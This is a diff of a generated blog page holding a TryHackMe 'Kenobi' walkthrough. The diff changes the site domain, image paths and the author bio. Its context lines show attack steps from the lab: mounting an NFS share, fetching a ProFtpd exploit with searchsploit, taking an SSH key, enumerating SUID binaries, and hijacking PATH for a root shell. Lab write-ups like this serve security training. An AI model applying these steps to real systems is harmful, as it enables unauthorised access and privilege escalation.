@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://eagle-rising-infosec.github.io/blog/2024/06/07/tryhackme-kenobi/">
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/07/tryhackme-kenobi/">
       
       
         <link rel="prev" href="../../../05/18/tryhackme-annie/">
@@ -76,7 +76,7 @@
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://eagle-rising-infosec.github.io/assets/images/social/blog/posts/tryhackme-kenobi.png" >
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/thm-kenobi/index.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -84,7 +84,7 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://eagle-rising-infosec.github.io/blog/2024/06/07/tryhackme-kenobi/" >
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/07/tryhackme-kenobi/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
@@ -92,7 +92,7 @@
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://eagle-rising-infosec.github.io/assets/images/social/blog/posts/tryhackme-kenobi.png" >
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/thm-kenobi/index.png" >
       
     
     
@@ -4093,7 +4093,7 @@
                         
                       </strong>
                       <br>
-                      Dad, husband, and Chief Learner
+                      Dad and husband. Chief Learning Officer.
                     </span>
                   </div>
                 
@@ -4182,7 +4182,7 @@
 
 <h1 id="tryhackme-kenobi">TryHackMe: Kenobi<a class="headerlink" href="#tryhackme-kenobi" title="Permanent link">&para;</a></h1>
 <figure>
-<p><a class="glightbox" href="../../../../images/tryhackme_kenobi/kenobi.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" height="300" src="../../../../images/tryhackme_kenobi/kenobi.png" width="300" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/kenobi.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" height="300" src="../../../../thm-kenobi/attachments/kenobi.png" width="300" /></a></p>
 <figcaption></figcaption>
 </figure>
 <p>Kenobi is an <strong>EASY</strong> room on <a href="https://tryhackme.com/r/room/kenobi">TryHackMe</a> that involves accessing an open Samba share, and then abusing a vulnerable version of ProFtpd to get a foothold on the machine, and then abusing a SUID binary to elevate privileges to root. </p>
@@ -4230,7 +4230,7 @@
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="nv">$ip</span>:/var<span class="w"> </span>var<span class="w"> </span>-o<span class="w"> </span>nolock
 </code></pre></div>
 <p>And then we can list the contents of the exported share.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607125757.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607125757.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607125757.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607125757.png" /></a></p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>tree
 <span class="go">.</span>
 <span class="go">├── backups</span>
@@ -4550,7 +4550,7 @@
 </code></pre></div>
 <h3 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h3>
 <p>Checking exploit-db for exploits related to the ProFtpd version we identified, we see that there are 4 exploits found. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607133035.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607133035.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607133035.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607133035.png" /></a></p>
 <p>I'm going to grab the exploit 49908 using </p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">49908</span>
 </code></pre></div>
@@ -4572,7 +4572,7 @@
 <span class="go">[!] Directory might not be writable</span>
 </code></pre></div>
 <p>After running the exploit, we can see that the key is now in the <code>/var/tmp</code> directory.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607134152.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607134152.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134152.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134152.png" /></a></p>
 <p>After changing the permissions on the key to 600 (<code>chmod 600 &lt;KEY&gt;</code>) we're able to ssh into the box as the <code>kenobi</code> user. </p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>ssh<span class="w"> </span>-i<span class="w"> </span>kenobi<span class="w"> </span>kenobi@<span class="nv">$ip</span>
 
@@ -4602,9 +4602,9 @@
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 </code></pre></div>
 <p>One stands out as odd.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607134737.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607134737.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134737.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134737.png" /></a></p>
 <p>Running that binary, we're presented with three options. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607134822.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607134822.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134822.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607134822.png" /></a></p>
 <p>Running through all the options once, it seems pretty straightforward, so we'll need to figure out a way to abuse it.</p>
 <div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span>/usr/bin/menu
 
@@ -4687,7 +4687,7 @@
 <div class="highlight"><pre><span></span><code><span class="gp">kenobi@kenobi:~$ </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
 </code></pre></div>
 <p>Running the <code>/usr/bin/menu</code> binary again and selecting option 3 causes the application to run OUR version of <code>bash</code> and gives us a shell as root. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607140530.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607140530.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-kenobi/attachments/Pasted%20image%2020240607140530.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-kenobi/attachments/Pasted%20image%2020240607140530.png" /></a></p>
 
 
 
